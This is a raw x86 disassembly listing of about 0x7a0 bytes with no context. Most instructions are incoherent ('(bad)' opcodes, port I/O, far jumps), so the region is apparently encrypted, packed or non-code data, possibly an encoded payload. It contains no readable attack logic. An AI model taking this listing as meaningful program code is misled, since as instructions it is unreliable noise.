  417b0e:	and    cl,cl
  417b10:	fnstenv [edx-0x4]
  417b13:	aaa    
  417b14:	jl     0x417b61
  417b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b17:	ret    0xaa0e
  417b1a:	and    eax,0xc611b4e0
  417b1f:	bound  ebp,QWORD PTR [ebp+0xb0964a7]
  417b25:	and    ch,dh
  417b27:	js     0x417abd
  417b29:	dec    esp
  417b2a:	cmp    edx,DWORD PTR [edi+0x60040852]
  417b30:	dec    esp
  417b31:	mov    dh,0xe5
  417b33:	nop
  417b34:	and    eax,0x452458e9
  417b39:	jb     0x417b1e
  417b3b:	mov    ebx,0xb74a1668
  417b40:	ss push 0x662faafc
  417b46:	push   edi
  417b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b48:	aas    
  417b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b4a:	xchg   ebx,eax
  417b4b:	pop    ebx
  417b4c:	cwde   
  417b4d:	jmp    0xc967cc0e
  417b52:	(bad)  
  417b53:	inc    esi
  417b54:	mov    ?,WORD PTR [esi-0x2110f89a]
  417b5a:	sub    BYTE PTR [esi-0x5e],0xf8
  417b5e:	popw   es
  417b60:	jnp    0x417b69
  417b62:	lods   al,BYTE PTR ds:[esi]
  417b63:	mov    edi,ebp
  417b65:	jmp    0x7afe9073
  417b6a:	test   BYTE PTR [ecx+0x66],dh
  417b6d:	sti    
  417b6e:	inc    ebp
  417b6f:	add    ecx,esi
  417b71:	popa   
  417b72:	adc    DWORD PTR [ebp+ebp*8-0x4c6790d8],esi
  417b79:	xchg   esp,eax
  417b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7b:	xchg   DWORD PTR [ebp-0x27],esp
  417b7e:	mov    cl,0x29
  417b80:	push   ecx
  417b81:	(bad)  
  417b82:	pop    ss
  417b83:	fimul  WORD PTR [ebp+0x3f764aa9]
  417b89:	xchg   esp,eax
  417b8a:	inc    ecx
  417b8b:	pusha  
  417b8c:	pop    es
  417b8d:	sbb    bl,bh
  417b8f:	mov    cl,0x71
  417b91:	fst    DWORD PTR [esi-0xa]
  417b94:	xchg   BYTE PTR [edi+0x519f0148],ah
  417b9a:	jmp    0x417bed
  417b9c:	lea    ecx,[edx+edx*1]
  417b9f:	jg     0x417b43
  417ba1:	inc    ebp
  417ba2:	mov    esp,0x8e54a766
  417ba7:	inc    edx
  417ba8:	xchg   ebx,esp
  417baa:	inc    ebx
  417bab:	fxch   st(6)
  417bad:	push   esp
  417bae:	in     eax,dx
  417baf:	push   esi
  417bb0:	imul   DWORD PTR [ebx+0x6a]
  417bb3:	inc    ebx
  417bb4:	adc    BYTE PTR [ebx-0x2b],0x85
  417bb8:	mov    ds:0xc0f3d3c7,al
  417bbd:	(bad)  
  417bbe:	dec    ecx
  417bbf:	sbb    eax,0xec101e8d
  417bc4:	loop   0x417c14
  417bc6:	leave  
  417bc7:	mov    esi,eax
  417bc9:	in     al,0xb5
  417bcb:	pop    edx
  417bcc:	adc    ah,BYTE PTR [eax+0x4b401bc1]
  417bd2:	xor    ah,BYTE PTR ds:0xae15c1e
  417bd8:	push   ss
  417bd9:	scas   al,BYTE PTR es:[edi]
  417bda:	loope  0x417b8b
  417bdc:	mov    DWORD PTR [ebx],esp
  417bde:	into   
  417bdf:	mov    BYTE PTR cs:[edi],dl
  417be2:	mov    DWORD PTR [esi-0x26f2fd1c],ebp
  417be8:	sbb    DWORD PTR [eax-0x4d34a3fc],esp
  417bee:	arpl   WORD PTR [edi],bp
  417bf0:	shr    eax,0x4e
  417bf3:	sub    BYTE PTR [edi],al
  417bf5:	mov    bl,0xb7
  417bf7:	mov    bl,dh
  417bf9:	jae    0x417c2f
  417bfb:	xor    DWORD PTR [esi-0x188499e],ecx
  417c01:	lods   al,BYTE PTR ds:[esi]
  417c02:	cwde   
  417c03:	push   edx
  417c04:	scas   eax,DWORD PTR es:[edi]
  417c05:	lahf   
  417c06:	push   esi
  417c07:	ss mov ecx,0x7af85d5d
  417c0d:	mov    bl,0xcb
  417c0f:	popa   
  417c10:	adc    BYTE PTR [ecx-0x283ac9d3],cl
  417c16:	imul   ebx,DWORD PTR [ebp-0x3a],0xeeb3a77e
  417c1d:	jno    0x417c40
  417c1f:	in     al,dx
  417c20:	push   0xffffffbd
  417c22:	xor    ebx,ebx
  417c24:	mov    ebx,0x3341655
  417c29:	jle    0x417ca0
  417c2b:	xchg   esp,eax
  417c2c:	mov    esi,0xaa1395e2
  417c31:	sbb    ebx,DWORD PTR [esi+0x55]
  417c34:	mov    dl,0x91
  417c36:	call   0x19e7e36b
  417c3b:	push   ebp
  417c3c:	icebp  
  417c3d:	xor    ch,BYTE PTR [ebx-0x2a341e77]
  417c43:	sar    ah,cl
  417c45:	lea    edx,[edi-0xcb8]
  417c4b:	fdivr  QWORD PTR [eax]
  417c4d:	js     0x417c3c
  417c4f:	and    eax,0x2541cf7c
  417c54:	in     al,0x7
  417c56:	loop   0x417cd0
  417c58:	mov    dl,0x14
  417c5a:	xlat   BYTE PTR ds:[ebx]
  417c5b:	jmp    0x30935087
  417c60:	add    dh,dl
  417c62:	out    0xa5,eax
  417c64:	or     bh,ch
  417c66:	into   
  417c67:	aam    0x4b
  417c69:	dec    esi
  417c6a:	push   ebx
  417c6b:	push   0xffffffe3
  417c6d:	jmp    0xc8d62a1a
  417c72:	xchg   ecx,eax
  417c73:	sbb    DWORD PTR [ebx],eax
  417c75:	mov    al,0x64
  417c77:	dec    ecx
  417c78:	fldcw  WORD PTR [eax+0x52]
  417c7b:	push   ecx
  417c7c:	scas   eax,DWORD PTR es:[edi]
  417c7d:	add    eax,0xf2704cd2
  417c82:	in     eax,dx
  417c83:	inc    ecx
  417c84:	js     0x417c7b
  417c86:	mov    DWORD PTR [edi-0xb6a3e56],edi
  417c8c:	sahf   
  417c8d:	sub    esi,DWORD PTR [edi-0x2f762d75]
  417c93:	mov    esp,0x98f97ea4
  417c98:	inc    eax
  417c99:	push   ebx
  417c9a:	adc    al,0x4d
  417c9c:	jl     0x417cec
  417c9e:	cmp    ch,bl
  417ca0:	and    eax,0xbe94ada0
  417ca5:	addr16 xchg ecx,eax
  417ca7:	jg     0x417cf4
  417ca9:	fs inc edi
  417cab:	and    BYTE PTR [ebp-0x4da53669],0xce
  417cb2:	shl    DWORD PTR [ebx],0xef
  417cb5:	pop    ds
  417cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb7:	mov    esp,0xbeaca5ad
  417cbc:	mov    ecx,0xacd2c7d3
  417cc1:	pop    ebx
  417cc2:	shl    DWORD PTR [edi],0x0
  417cc5:	xor    eax,0xd1fa3bea
  417cca:	push   ecx
  417ccb:	dec    esi
  417ccc:	cli    
  417ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cce:	adc    bl,BYTE PTR [ebp+esi*4+0x704d513e]
  417cd5:	or     edi,DWORD PTR ss:0xa14a62db
  417cdc:	mov    edi,0x635b35eb
  417ce1:	jmp    0x417cf8
  417ce3:	jg     0x417cda
  417ce5:	scas   al,BYTE PTR es:[edi]
  417ce6:	imul   BYTE PTR [ebp-0x518073d1]
  417cec:	sub    DWORD PTR [edx-0x74a52d15],eax
  417cf2:	cs push eax
  417cf4:	mov    ds:0xaf2c10ad,eax
  417cf9:	adc    BYTE PTR [ebx],dl
  417cfb:	mov    ebp,0x42660941
  417d00:	inc    ecx
  417d01:	mov    ebx,0x6e0ddf92
  417d06:	imul   esi,DWORD PTR [eax-0x6d731183],0xd3acc5f4
  417d10:	les    eax,FWORD PTR [eax]
  417d12:	and    al,0xf7
  417d14:	mov    eax,0xa0bd1832
  417d19:	push   edx
  417d1a:	xchg   bp,ax
  417d1c:	daa    
  417d1d:	mov    ecx,0xe8e19120
  417d22:	(bad)  
  417d23:	fild   QWORD PTR [edx]
  417d25:	sbb    al,0x74
  417d27:	inc    edi
  417d28:	outs   dx,BYTE PTR ds:[esi]
  417d29:	out    dx,al
  417d2a:	icebp  
  417d2b:	fcom   QWORD PTR [ecx]
  417d2d:	mov    eax,0xb13252f5
  417d32:	pop    ebp
  417d33:	or     eax,0x1acfa0d8
  417d38:	clc    
  417d39:	jmp    ebx
  417d3b:	jecxz  0x417d20
  417d3d:	stos   BYTE PTR es:[edi],al
  417d3e:	rol    BYTE PTR [edx+0x68],1
  417d41:	call   0xf240fd3a
  417d46:	xchg   ebx,eax
  417d47:	push   esp
  417d48:	mov    eax,ds:0x9e9f905e
  417d4d:	cmp    eax,0xa3741ede
  417d52:	test   ebp,esi
  417d54:	into   
  417d55:	es xchg ebx,eax
  417d57:	in     al,0x93
  417d59:	test   al,0xd2
  417d5b:	retf   
  417d5c:	pop    es
  417d5d:	mov    BYTE PTR [esi-0x47],ah
  417d60:	push   edx
  417d61:	or     al,0x77
  417d63:	das    
  417d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d65:	dec    esi
  417d66:	sub    al,0x36
  417d68:	cmp    BYTE PTR [edx+eax*8+0xd],bl
  417d6c:	jle    0x417d32
  417d6e:	or     DWORD PTR [ebp-0x20cf8727],edi
  417d74:	bound  ebx,QWORD PTR [eax]
  417d76:	mov    esi,0x7b2f0f66
  417d7b:	cmc    
  417d7c:	dec    ax
  417d7e:	(bad)  [edi]
  417d80:	mov    ah,BYTE PTR [ebx+0x4eb834f9]
  417d86:	aad    0x6b
  417d88:	retf   0x6749
  417d8b:	ins    BYTE PTR es:[edi],dx
  417d8c:	sbb    ch,BYTE PTR [ebp+0x2a]
  417d8f:	cmp    DWORD PTR [edx],esp
  417d91:	jns    0x417d24
  417d93:	sbb    al,0x0
  417d95:	cmp    eax,DWORD PTR [edi+eiz*8]
  417d98:	mov    cl,0x9c
  417d9a:	mov    al,BYTE PTR [ecx+ebp*2+0x7e]
  417d9e:	push   ebx
  417d9f:	inc    eax
  417da0:	sub    BYTE PTR [ecx-0x1406c10d],al
  417da6:	pop    ebx
  417da7:	lea    ecx,[edx-0x44]
  417daa:	sub    eax,0xac5a9313
  417daf:	out    0x4d,eax
  417db1:	loope  0x417d3f
  417db3:	mov    eax,0x4f12b049
  417db8:	nop    DWORD PTR [edx]
  417dbb:	or     eax,0x32675e58
  417dc0:	or     al,0xbc
  417dc2:	pop    edx
  417dc3:	jbe    0x417d45
  417dc5:	xor    DWORD PTR [ebx-0x68590b31],0xffffff9f
  417dcc:	mov    dh,0x73
  417dce:	stos   BYTE PTR es:[edi],al
  417dcf:	int3   
  417dd0:	(bad)  
  417dd1:	mov    esi,0xec97d900
  417dd6:	(bad)  
  417dd7:	(bad)  
  417dd8:	mov    ah,0x4b
  417dda:	pop    esi
  417ddb:	mov    edi,0xf8bf1432
  417de0:	arpl   WORD PTR [edx+0x30453ab5],cx
  417de6:	push   es
  417de7:	push   ds
  417de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417de9:	stos   BYTE PTR es:[edi],al
  417dea:	ins    DWORD PTR es:[edi],dx
  417deb:	stc    
  417dec:	pop    esi
  417ded:	call   0x42a72455
  417df2:	lods   al,BYTE PTR ds:[esi]
  417df3:	aaa    
  417df4:	ins    DWORD PTR es:[edi],dx
  417df5:	in     al,0xd
  417df7:	jns    0x417e64
  417df9:	jecxz  0x417e19
  417dfb:	stos   DWORD PTR es:[edi],eax
  417dfc:	pop    esp
  417dfd:	adc    al,0xc3
  417dff:	in     al,0xbf
  417e01:	xchg   ecx,eax
  417e02:	push   0xffffffbe
  417e04:	adc    ah,cl
  417e06:	add    bh,BYTE PTR [edi]
  417e08:	(bad)  
  417e09:	mov    BYTE PTR [ebp+0x178cdfc7],cl
  417e0f:	add    bh,al
  417e11:	sahf   
  417e12:	push   eax
  417e13:	mov    edx,0x7329b2bf
  417e18:	push   esi
  417e19:	stc    
  417e1a:	xchg   ebp,eax
  417e1b:	add    DWORD PTR [edx+0x4c],ebx
  417e1e:	sub    eax,DWORD PTR [ebx-0x6]
  417e21:	js     0x417e2a
  417e23:	push   es
  417e24:	ds or  eax,0x438b32b3
  417e2a:	out    dx,al
  417e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2c:	aaa    
  417e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2e:	or     eax,0x39a367d3
  417e33:	ret    
  417e34:	mov    esp,0xa8f7c4ea
  417e39:	mov    ah,0x1c
  417e3b:	lods   al,BYTE PTR ds:[esi]
  417e3c:	lahf   
  417e3d:	outs   dx,BYTE PTR ds:[esi]
  417e3e:	xor    ebx,DWORD PTR [esi+0x66a478be]
  417e44:	sub    BYTE PTR [edx+0x1],0xdc
  417e48:	sub    BYTE PTR [ebx],ch
  417e4a:	popf   
  417e4b:	rol    BYTE PTR [ecx+ebx*8+0x3c],0x60
  417e50:	mov    eax,ds:0x71b83dd6
  417e55:	dec    edx
  417e56:	sbb    al,0x99
  417e58:	ins    DWORD PTR es:[edi],dx
  417e59:	scas   eax,DWORD PTR es:[di]
  417e5b:	lahf   
  417e5c:	daa    
  417e5d:	ret    
  417e5e:	sub    BYTE PTR [edx],bl
  417e60:	xchg   edx,eax
  417e61:	ret    
  417e62:	inc    ebx
  417e63:	dec    eax
  417e64:	xor    eax,0xa4f195b6
  417e69:	out    0x66,eax
  417e6b:	sbb    dl,bl
  417e6d:	or     DWORD PTR [eax+eiz*8],edx
  417e70:	push   es
  417e71:	pushw  cs
  417e73:	dec    edx
  417e74:	jnp    0x417e75
  417e76:	shl    DWORD PTR [ecx],0x65
  417e79:	jne    0x417e5b
  417e7b:	dec    ecx
  417e7c:	enter  0x124f,0xd1
  417e80:	pop    es
  417e81:	jo     0x417eb3
  417e83:	mov    esi,DWORD PTR [ebx-0x2c]
  417e86:	cld    
  417e87:	adc    esi,DWORD PTR [edi+0x14]
  417e8a:	(bad)  
  417e8b:	jmp    0x2938:0xc6b81167
  417e92:	xchg   DWORD PTR [edx+0x65],eax
  417e95:	mov    esp,0x13356c46
  417e9a:	and    edx,ecx
  417e9c:	imul   esp,esi,0x77b185f3
  417ea2:	retf   
  417ea3:	push   esi
  417ea4:	popf   
  417ea5:	xchg   DWORD PTR [ebx-0x6f],ebx
  417ea8:	pop    edi
  417ea9:	xor    BYTE PTR [esi],dl
  417eab:	(bad)  
  417eac:	sub    BYTE PTR ds:0x39e3e387,ah
  417eb2:	fsubr  QWORD PTR [esi-0x2d]
  417eb5:	mov    ds:0x39258700,eax
  417eba:	inc    ebp
  417ebb:	and    DWORD PTR [eax+0x34017197],esp
  417ec1:	add    bh,dh
  417ec3:	sbb    DWORD PTR [esi],ecx
  417ec5:	mov    bh,0xe2
  417ec7:	popa   
  417ec8:	and    DWORD PTR [edi],esi
  417eca:	push   eax
  417ecb:	jmp    0xdaaf:0x3352b716
  417ed2:	mov    DWORD PTR [esp+edi*8-0x136700fd],eax
  417ed9:	ret    
  417eda:	dec    esp
  417edb:	out    0xb1,al
  417edd:	ret    
  417ede:	retf   0x2a80
  417ee1:	es jbe 0x417ea0
  417ee4:	div    DWORD PTR [esi+ebx*2]
  417ee7:	shl    esp,1
  417ee9:	(bad)  
  417eea:	mov    esp,0x8b6ab534
  417eef:	adc    al,0xe5
  417ef1:	je     0x417f6f
  417ef3:	dec    eax
  417ef4:	pop    ecx
  417ef5:	cmp    DWORD PTR [edx],eax
  417ef7:	test   BYTE PTR [edx],0x6e
  417efa:	xchg   edi,eax
  417efb:	push   cs
  417efc:	in     al,dx
  417efd:	int    0x48
  417eff:	xchg   edi,eax
  417f00:	push   ds
  417f01:	xor    DWORD PTR es:[ebp-0x20bc7c8],esp
  417f08:	sbb    BYTE PTR [edi+eax*2-0x1807877c],cl
  417f0f:	jns    0x417eb9
  417f11:	mov    al,0x35
  417f13:	das    
  417f14:	fwait
  417f15:	into   
  417f16:	aam    0x6
  417f18:	ds dec edi
  417f1a:	mov    cl,0x87
  417f1c:	pushf  
  417f1d:	sub    al,0x86
  417f1f:	test   ebp,ebp
  417f21:	push   ss
  417f22:	neg    BYTE PTR [edi+0x2e58983a]
  417f28:	sbb    dl,bl
  417f2a:	mov    ah,0xf9
  417f2c:	js     0x417f79
  417f2e:	jnp    0x417f72
  417f30:	push   edx
  417f31:	arpl   WORD PTR [edx-0x4565d813],dx
  417f37:	stos   DWORD PTR es:[edi],eax
  417f38:	jmp    0x417f66
  417f3a:	test   al,0x4d
  417f3c:	cmp    DWORD PTR [edi-0x6856bbca],esp
  417f42:	mov    ds:0x4211067a,al
  417f47:	scas   eax,DWORD PTR es:[edi]
  417f48:	pop    ebx
  417f49:	imul   eax,DWORD PTR [esi-0x2abb2ca5],0xffffff8d
  417f50:	push   esp
  417f51:	ret    
  417f52:	fimul  WORD PTR [ecx-0x22]
  417f55:	iret   
  417f56:	inc    esi
  417f57:	(bad)  
  417f58:	call   0x86643d9a
  417f5d:	xor    eax,0xea9a0826
  417f62:	sbb    BYTE PTR [edx],al
  417f64:	xchg   esi,eax
  417f65:	xchg   BYTE PTR [ebx-0x751e228b],bh
  417f6b:	rcl    BYTE PTR [edx-0x32],1
  417f6e:	pop    eax
  417f6f:	and    ebx,DWORD PTR [eax]
  417f71:	dec    ecx
  417f72:	dec    esp
  417f73:	mov    bh,0xfc
  417f75:	push   esp
  417f76:	test   BYTE PTR [edi-0x1e],cl
  417f79:	test   DWORD PTR [esi+eiz*8-0x67],0x7851f289
  417f81:	xchg   esi,eax
  417f82:	jbe    0x417f64
  417f84:	jnp    0x417fd8
  417f86:	adc    ecx,esp
  417f88:	mov    eax,ds:0xcea1ea75
  417f8d:	pop    ds
  417f8e:	pop    edi
  417f8f:	mov    ch,0xed
  417f91:	mov    ds:0xff47468d,al
  417f96:	fwait
  417f97:	mov    ds:0x5025ed5f,al
  417f9c:	lods   al,BYTE PTR ds:[esi]
  417f9d:	ret    0x1b80
  417fa0:	in     al,0x52
  417fa2:	repnz push esp
  417fa4:	push   cs
  417fa5:	jnp    0x417f9d
  417fa7:	add    ebx,DWORD PTR [ebx-0x14]
  417faa:	(bad)  
  417fab:	out    dx,al
  417fac:	dec    esp
  417fad:	mov    bh,0x84
  417faf:	xlat   BYTE PTR ds:[ebx]
  417fb0:	nop
  417fb1:	(bad)
  417fb4:	loopne 0x417f9a
  417fb6:	cmp    eax,0xa9aa85f7
  417fbb:	dec    esi
  417fbc:	pop    eax
  417fbd:	loopne 0x417fc5
  417fbf:	cmp    dl,BYTE PTR [esi]
  417fc1:	adc    ebp,esi
  417fc3:	mov    ch,0x70
  417fc5:	pop    ds
  417fc6:	push   cs
  417fc7:	fisttp DWORD PTR [ecx+edi*1+0x30314113]
  417fce:	pop    esi
  417fcf:	cs (bad) 
  417fd2:	jb     0x417f8f
  417fd4:	(bad)  
  417fd5:	fist   WORD PTR [eax]
  417fd7:	push   ebp
  417fd8:	pop    ds
  417fd9:	js     0x417fa1
  417fdb:	aaa    
  417fdc:	aaa    
  417fdd:	sbb    bl,ah
  417fdf:	ret    0xf5a
  417fe2:	push   ebp
  417fe3:	sbb    BYTE PTR [esi],0xe0
  417fe6:	shl    BYTE PTR cs:[edx-0x6c],0x48
  417feb:	mov    ecx,0x9597eba3
  417ff0:	fldpi  
  417ff2:	fs js  0x417f78
  417ff5:	inc    edi
  417ff6:	push   cs
  417ff7:	jmp    0x417f7c
  417ff9:	cmp    al,0x61
  417ffb:	xor    edi,DWORD PTR [ecx+0x61b00029]
  418001:	dec    eax
  418002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418003:	jbe    0x417fcd
  418005:	inc    ecx
  418006:	push   es
  418007:	outs   dx,DWORD PTR ds:[esi]
  418008:	sub    dh,bh
  41800a:	xchg   BYTE PTR [ecx],dh
  41800c:	jmp    0x417fbd
  41800e:	js     0x417fc3
  418010:	add    DWORD PTR [ebx+0x51f21a25],ebx
  418016:	shr    BYTE PTR [edi+0x3a],1
  418019:	in     al,0xa8
  41801b:	or     eax,DWORD PTR ss:[ebx]
  41801e:	aad    0xf9
  418020:	dec    ecx
  418021:	dec    esi
  418022:	ss pop esi
  418024:	ret    
  418025:	in     eax,0xa8
  418027:	and    eax,0x61c411cb
  41802c:	mov    eax,ds:0x64d943d5
  418031:	dec    eax
  418032:	popf   
  418033:	cmc    
  418034:	mov    ?,WORD PTR [ecx]
  418036:	lods   eax,DWORD PTR ds:[esi]
  418037:	retf   0x6eba
  41803a:	ins    DWORD PTR es:[edi],dx
  41803b:	inc    ebp
  41803c:	scas   eax,DWORD PTR es:[edi]
  41803d:	jno    0x41803a
  41803f:	jp     0x417fc1
  418041:	or     al,0x58
  418043:	mov    esi,0xdc5b6f2d
  418048:	inc    ecx
  418049:	dec    esi
  41804a:	int    0x1f
  41804c:	or     eax,0xe508c6e3
  418051:	jge    0x418097
  418053:	xor    al,0xe0
  418055:	push   0xffffff86
  418057:	xor    ch,dh
  418059:	inc    DWORD PTR [ebp+eax*1-0x16]
  41805d:	fnstsw WORD PTR [edx+0x68be399d]
  418063:	ret    0xb29a
  418066:	cmp    eax,0xa045aea3
  41806b:	fsub   QWORD PTR [eax-0x2b]
  41806e:	test   eax,0xaa8ad3a5
  418073:	push   esi
  418074:	inc    ebx
  418075:	jae    0x418029
  418077:	pop    es
  418078:	dec    esi
  418079:	push   ebp
  41807a:	sbb    BYTE PTR [esi+0x10],bl
  41807d:	test   eax,0xf165151d
  418082:	mov    edx,0x78ef38e9
  418087:	cld    
  418088:	fwait
  418089:	push   esp
  41808a:	jne    0x418035
  41808c:	jl     0x418073
  41808e:	ss xchg ebp,eax
  418090:	sbb    dh,ch
  418092:	mov    ebx,0x8e02aa98
  418097:	sub    ch,al
  418099:	and    eax,0x35c9b73a
  41809e:	sub    al,0x66
  4180a0:	lods   al,BYTE PTR ds:[esi]
  4180a1:	(bad)  
  4180a2:	adc    BYTE PTR [esi],dl
  4180a4:	mov    al,BYTE PTR [edx]
  4180a6:	lods   al,BYTE PTR ds:[esi]
  4180a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180a8:	aaa    
  4180a9:	arpl   WORD PTR [eax+0x7f52215],ax
  4180af:	mov    bl,0x21
  4180b1:	fwait
  4180b2:	dec    eax
  4180b3:	lods   al,BYTE PTR ds:[esi]
  4180b4:	push   0xdc5d5c3f
  4180b9:	mov    ah,0x3b
  4180bb:	add    esp,DWORD PTR [edx+0x34]
  4180be:	dec    edx
  4180bf:	push   edx
  4180c0:	mov    DWORD PTR [esi-0x2f235b3d],eax
  4180c6:	ret    0xab71
  4180c9:	jns    0x4180a4
  4180cb:	push   ebx
  4180cc:	outs   dx,DWORD PTR ss:[esi]
  4180ce:	jmp    0x4180e1
  4180d0:	fstp   st(0)
  4180d2:	inc    esp
  4180d3:	outs   dx,DWORD PTR ds:[esi]
  4180d4:	clc    
  4180d5:	lods   al,BYTE PTR ds:[esi]
  4180d6:	push   esp
  4180d7:	inc    edx
  4180d8:	or     edi,DWORD PTR [ebp+0x6c3a59eb]
  4180de:	scas   al,BYTE PTR es:[edi]
  4180df:	mov    cl,0x4b
  4180e1:	aas    
  4180e2:	xor    BYTE PTR [edx-0x43ae11cf],dl
  4180e8:	inc    ebx
  4180e9:	adc    DWORD PTR [ebp-0x50],ebp
  4180ec:	stos   BYTE PTR es:[edi],al
  4180ed:	outs   dx,BYTE PTR ds:[esi]
  4180ee:	cmp    al,0x4a
  4180f0:	addr16 inc ecx
  4180f2:	jbe    0x41809c
  4180f4:	aam    0x75
  4180f6:	popa   
  4180f7:	adc    al,0xd3
  4180f9:	adc    eax,0xc7c378b2
  4180fe:	icebp  
  4180ff:	adc    eax,0x3836462a
  418104:	jmp    0x1c06:0xcc0bbf7f
  41810b:	test   DWORD PTR [ecx],esi
  41810d:	sbb    BYTE PTR [eax-0x14],ah
  418110:	lea    eax,[edx]
  418112:	inc    ecx
  418113:	sbb    eax,0x9c928ff1
  418118:	jo     0x418156
  41811a:	push   ecx
  41811b:	push   ds
  41811c:	xor    eax,0xa2e62f59
  418121:	xor    DWORD PTR [ebp+0x58],ebp
  418124:	jmp    0x418114
  418126:	pop    ebp
  418127:	push   edx
  418128:	out    0x13,al
  41812a:	in     eax,0xc8
  41812c:	loope  0x41818e
  41812e:	inc    edi
  41812f:	cs dec eax
  418131:	mov    edi,0x9e3294cb
  418136:	ins    BYTE PTR es:[edi],dx
  418137:	adc    eax,0xe013d798
  41813c:	jae    0x4180be
  41813e:	mov    edi,0xdf2d70d
  418143:	pop    ecx
  418144:	inc    edi
  418145:	mov    BYTE PTR [eax+0x68],cl
  418148:	mov    ds:0x95ce2ccc,eax
  41814d:	test   eax,0xe5bb85e7
  418152:	ret    
  418153:	rcr    BYTE PTR [eax+0x2a66aa7f],cl
  418159:	ja     0x418172
  41815b:	retf   0x6e96
  41815e:	fld    QWORD PTR [edx-0x2215620d]
  418164:	imul   ecx,DWORD PTR [ebx+0xd7026ec],0x2e122e7f
  41816e:	inc    eax
  41816f:	(bad)  
  418170:	mov    bh,0xd
  418172:	inc    BYTE PTR [ebp+0x16]
  418175:	cwde   
  418176:	std    
  418177:	aad    0xb3
  418179:	popf   
  41817a:	mov    edx,esi
  41817c:	arpl   ax,dx
  41817e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41817f:	stos   DWORD PTR es:[edi],eax
  418180:	popfw  
  418182:	test   BYTE PTR [ecx],0x72
  418185:	cld    
  418186:	sbb    eax,0x96a2a23a
  41818b:	fidivr DWORD PTR ds:0xc939fe2d
  418191:	xchg   esp,eax
  418192:	in     al,dx
  418193:	xor    BYTE PTR [edx-0x74],bl
  418196:	cmp    edi,eax
  418198:	ja     0x41816f
  41819a:	inc    edx
  41819b:	iret   
  41819c:	inc    ebp
  41819d:	fistp  DWORD PTR [edi-0x7a6e85a5]
  4181a3:	mov    ebx,eax
  4181a5:	ret    
  4181a6:	and    ecx,edi
  4181a8:	cmp    BYTE PTR [edx-0x5d],dh
  4181ab:	cdq    
  4181ac:	ds cmp cl,bl
  4181af:	pop    edi
  4181b0:	mov    dh,0xf5
  4181b2:	push   0xf594df67
  4181b7:	ins    BYTE PTR es:[edi],dx
  4181b8:	push   ebx
  4181b9:	ins    DWORD PTR es:[edi],dx
  4181ba:	and    esp,DWORD PTR [edi-0x75]
  4181bd:	pop    ecx
  4181be:	mov    cl,BYTE PTR [esi]
  4181c0:	jmp    0x1627:0x1934e071
  4181c7:	fcomp  QWORD PTR [eax-0x2e6ab58a]
  4181cd:	mov    dh,0x5b
  4181cf:	push   cs
  4181d0:	aaa    
  4181d1:	push   0x28626e9f
  4181d6:	popf   
  4181d7:	jmp    0xf9265df8
  4181dc:	mov    ch,0x6c
  4181de:	or     DWORD PTR [ebx+0x3],0x18
  4181e2:	jbe    0x418236
  4181e4:	xor    edx,DWORD PTR [ecx+0x3e]
  4181e7:	fstp   QWORD PTR [eax]
  4181e9:	xchg   bl,ah
  4181eb:	(bad)  
  4181ec:	repnz ss sbb edi,0xffffffe6
  4181f1:	sahf   
  4181f2:	sbb    eax,0xd5161203
  4181f7:	shl    ch,1
  4181f9:	adc    DWORD PTR [ebp+0x1d],esp
  4181fc:	sbb    DWORD PTR [edx-0x31648c59],eax
  418202:	das    
  418203:	nop
  418204:	out    dx,al
  418205:	inc    eax
  418206:	aas    
  418207:	inc    esp
  418208:	jb     0x418224
  41820a:	jge    0x418221
  41820c:	lock imul ebx,ebx,0xde9f8696
  418213:	push   ds
  418214:	add    BYTE PTR ds:[esi],dh
  418217:	mov    al,bh
  418219:	loope  0x418200
  41821b:	sti    
  41821c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41821d:	mov    al,0x8e
  41821f:	inc    ebx
  418220:	jg     0x4181e2
  418222:	lock add eax,0x19c8b7be
  418228:	ret    
  418229:	bound  ebp,QWORD PTR [esi+0x6e]
  41822c:	inc    esp
  41822d:	mov    dh,0xbe
  41822f:	ds ret 
  418231:	pop    ebx
  418232:	outs   dx,BYTE PTR ds:[esi]
  418233:	adc    eax,0xdb445b23
  418238:	cmc    
  418239:	fist   DWORD PTR [eax]
  41823b:	sub    edi,esp
  41823d:	dec    ebp
  41823e:	cmp    ecx,DWORD PTR [eax-0x1ec2524a]
  418244:	push   0x459ccfea
  418249:	in     al,dx
  41824a:	push   esi
  41824b:	mov    esi,0x7ec6a71d
  418250:	adc    al,0x7e
  418252:	add    al,0x5d
  418254:	inc    ebx
  418255:	in     eax,dx
  418256:	add    BYTE PTR [eax-0x2d090fed],dl
  41825c:	mov    ss,WORD PTR [edi-0x3a7277c1]
  418262:	cmc    
  418263:	xor    bl,ch
  418265:	pop    edx
  418266:	mov    eax,ds:0xa44a029d
  41826b:	inc    ecx
  41826c:	mov    bh,0x52
  41826e:	leave  
  41826f:	psraw  mm3,QWORD PTR [edi]
  418272:	imul   ebx
  418274:	xor    BYTE PTR [eax],dh
  418276:	or     dl,BYTE PTR [edx+edi*2+0x42]
  41827a:	xchg   esp,eax
  41827b:	or     BYTE PTR [eax],cl
  41827d:	sti    
  41827e:	pop    eax
  41827f:	xchg   ebp,eax
  418280:	adc    DWORD PTR [ebp-0x8fa5f31],edi
  418286:	cs mov eax,0x8a36f10b
  41828c:	mov    ds:0x8176b7f6,al
  418291:	fistp  DWORD PTR [edi+0x74629026]
  418297:	xor    al,0x9c
  418299:	mov    bl,0x73
  41829b:	adc    ch,al
  41829d:	adc    eax,0x9f408718
  4182a2:	popf   
  4182a3:	jl     0x418233
  4182a5:	pop    edx
  4182a6:	inc    edi
  4182a7:	sub    BYTE PTR [esi+0x4a7ae452],ah
  4182ad:	jmp    0x418302
  4182af:	xor    BYTE PTR [ecx],al
  4182b1:	nop
  4182b2:	js     0x4182ee
  4182b4:	pushf  
